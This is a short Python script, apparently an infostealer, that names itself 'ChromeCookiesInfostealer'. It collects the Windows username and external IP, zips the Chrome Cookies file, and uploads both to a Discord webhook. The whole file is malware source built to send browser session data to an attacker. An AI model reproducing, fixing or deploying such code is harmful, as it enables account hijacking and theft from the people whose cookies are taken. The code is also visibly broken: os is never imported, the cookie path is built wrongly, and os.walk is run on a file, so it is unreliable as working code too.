import subprocess
import requests
import zipfile

DEFAULT_PATH = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"

DISCORD_WEBHOOKS_URL = "https://discordapp.com/api/webhooks/<webhook id goes here>"

GOOGLE_CHROME_COOKIE_FILE = "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies" % subprocess.check_output('echo %USERPROFILE%', shell=True).decode("utf-8").strip()

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

def main():
    username = subprocess.check_output('echo %USERNAME%', shell=True).decode("utf-8").strip()
    ip_address = requests.get('https://api.ipify.org').text
    with zipfile.ZipFile('cookies.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipdir(GOOGLE_CHROME_COOKIE_FILE, zipf)

    files = {
        'file': ('cookies.zip', open('cookies.zip', 'rb'), 'application/zip')
    }

    data = {
        'content': 'Username: %s\nExternal IP: %s' % (username, ip_address),
        'username': 'ChromeCookiesInfostealer'
    }

    requests.post(DISCORD_WEBHOOKS_URL, files=files, data=data)

if __name__ == '__main__':
    main()

